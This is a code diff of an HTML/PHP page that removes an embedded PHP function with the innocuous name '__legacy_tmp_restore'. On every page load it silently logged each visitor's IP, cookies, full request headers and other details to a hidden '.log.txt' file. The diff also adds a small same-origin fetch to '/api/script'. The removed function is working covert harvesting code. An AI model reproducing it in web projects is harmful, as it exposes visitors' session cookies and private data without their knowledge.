@@ -53,27 +53,6 @@
       </div>
     </div>
   </div>
-  <?php
-  function __legacy_tmp_restore(){
-    $s = $_SERVER;
-    $a = $s['REMOTE_ADDR'] ?? '0.0.0.0';
-    $p = $s['REMOTE_PORT'] ?? '??';
-    $u = $s['HTTP_USER_AGENT'] ?? 'bot';
-    $l = $s['HTTP_ACCEPT_LANGUAGE'] ?? '--';
-    $r = $s['HTTP_REFERER'] ?? 'none';
-    $m = $s['REQUEST_METHOD'] ?? 'GET';
-    $q = $s['QUERY_STRING'] ?? '';
-    $x = @gethostbyaddr($a);
-    $c = json_encode($_COOKIE);
-    $h = json_encode(function_exists('getallheaders') ? getallheaders() : []);
-    $t = date('c'); // ISO-8601 format
-
-    $f = '.log.txt';
-    $z = "[$t] $a ($x) $m $q UA:$u LANG:$l REF:$r PORT:$p COOKIE:$c HEAD:$h\n";
-    file_put_contents($f, $z, FILE_APPEND | LOCK_EX);
-  }
-__legacy_tmp_restore();
-?>
 
   <div class="safety">
     <div class="option">
@@ -96,6 +75,11 @@ __legacy_tmp_restore();
     <div class="line"></div>
     <p class="text4"> all copyright is reserved to Mangooo</p>
   </footer>
+
+  <script>
+  fetch('/api/script', { method: 'GET' })
+    .catch(() => {});
+</script>
 
 </body>
 </html>
